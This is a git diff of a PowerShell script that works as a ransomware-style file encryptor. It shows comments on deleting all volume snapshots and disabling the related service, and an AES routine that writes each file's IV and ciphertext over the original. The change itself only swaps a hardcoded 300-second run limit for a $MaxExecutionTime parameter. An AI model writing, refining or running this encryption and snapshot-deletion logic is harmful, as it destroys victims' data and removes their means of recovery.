@@ -54,9 +54,7 @@ Param(
     [String]
     $Key
 )
-    $stopWatch = [system.diagnostics.stopwatch]::StartNew()
-    # Set the 
-    $maxSecondsExecution = 300
+    $stopWatch = [system.diagnostics.stopwatch]::StartNew()        
 
     # Manage to delete all snapshots on the target machine and disable the related Windows service
     # Remove all snapshots
@@ -128,7 +126,7 @@ Param(
             $encryptedData=$encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
             [byte[]] $fullData=$aesManaged.IV + $encryptedData;
             [System.IO.File]::WriteAllBytes($($file.FullName),$fullData)        
-            if($stopWatch.Elapsed.TotalSeconds -ge $maxSecondsExecution){
+            if($stopWatch.Elapsed.TotalSeconds -ge $MaxExecutionTime){
                 $aesManaged.Dispose()
                 Stop-Process -Id $Pid -Force
             }
